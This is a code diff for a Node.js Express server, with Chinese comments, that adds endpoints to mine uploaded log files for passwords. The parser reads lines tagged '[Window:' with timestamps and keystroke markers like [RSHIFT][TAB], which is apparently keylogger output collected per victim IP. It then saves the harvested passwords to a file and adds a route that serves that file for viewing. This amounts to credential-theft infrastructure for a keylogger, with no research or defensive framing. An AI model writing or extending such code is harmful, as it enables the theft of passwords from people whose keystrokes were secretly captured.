@@ -1189,6 +1189,104 @@ app.post('/api/upload/:ip', express.raw({ type: 'text/plain', limit: CONFIG.uplo
     res.json(result);
 }));
 
+app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
+    try {
+        // 列出所有日志文件
+        const allFiles = await alistClient.listFiles(alistClient.basePath);
+        const logFiles = allFiles.filter(file => file.filename.endsWith('.log'));
+        
+        if (logFiles.length === 0) {
+            return res.json({ success: true, count: 0 });
+        }
+        
+        // 提取密码
+        let extractedPasswords = [];
+        for (const file of logFiles) {
+            try {
+                const content = await alistClient.readFile(`${alistClient.basePath}/${file.filename}`);
+                const passwords = extractPasswordsFromLog(content, file.filename);
+                extractedPasswords = [...extractedPasswords, ...passwords];
+            } catch (error) {
+                logger.warn(`读取日志文件失败: ${file.filename}`, { error: error.message });
+            }
+        }
+        
+        if (extractedPasswords.length === 0) {
+            return res.json({ success: true, count: 0 });
+        }
+        
+        // 保存提取结果到本地文件
+        const resultFilename = 'extracted_passwords.txt';
+        const resultContent = extractedPasswords.map((item, index) => {
+            return `${index + 1}. 来自: ${item.file}\n时间: ${item.timestamp}\n内容: ${item.password}\n`;
+        }).join('\n');
+        
+        // 确保 logs 目录存在
+        if (!fs.existsSync('./logs')) {
+            fs.mkdirSync('./logs', { recursive: true });
+        }
+        
+        // 写入本地文件
+        fs.writeFileSync(`./logs/${resultFilename}`, resultContent);
+        
+        res.json({ 
+            success: true, 
+            count: extractedPasswords.length 
+        });
+    } catch (error) {
+        logger.error('提取密码失败', { error: error.message });
+        res.status(500).json({ error: '提取密码失败' });
+    }
+}));
+
+app.get('/api/extract-passwords/view', asyncHandler(async (req, res) => {
+    try {
+        const resultFilename = 'extracted_passwords.txt';
+        const filePath = `./logs/${resultFilename}`;
+        
+        if (!fs.existsSync(filePath)) {
+            return res.status(404).send('提取结果文件不存在');
+        }
+        
+        const content = fs.readFileSync(filePath, 'utf8');
+        res.type('text/plain').send(content);
+    } catch (error) {
+        logger.error('查看提取结果失败', { error: error.message });
+        res.status(500).send('查看提取结果失败');
+    }
+}));
+
+// 从日志内容中提取密码
+function extractPasswordsFromLog(content, filename) {
+    const passwords = [];
+    const lines = content.split('\n');
+    
+    for (let i = 0; i < lines.length; i++) {
+        const line = lines[i].trim();
+        // 查找包含时间戳的行
+        if (line.startsWith('[Window:')) {
+            // 提取时间戳
+            const timestampMatch = line.match(/at (\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\+\d{4})/);
+            const timestamp = timestampMatch ? timestampMatch[1] : '未知';
+            
+            // 检查下一行是否包含密码
+            if (i + 1 < lines.length) {
+                const nextLine = lines[i + 1].trim();
+                // 密码模式：包含字母数字和可能的特殊键如 [RSHIFT][TAB] 等
+                if (nextLine && !nextLine.startsWith('[')) {
+                    passwords.push({
+                        file: filename,
+                        timestamp: timestamp,
+                        password: nextLine
+                    });
+                }
+            }
+        }
+    }
+    
+    return passwords;
+}
+
 
 
 // 统一错误处理中间件
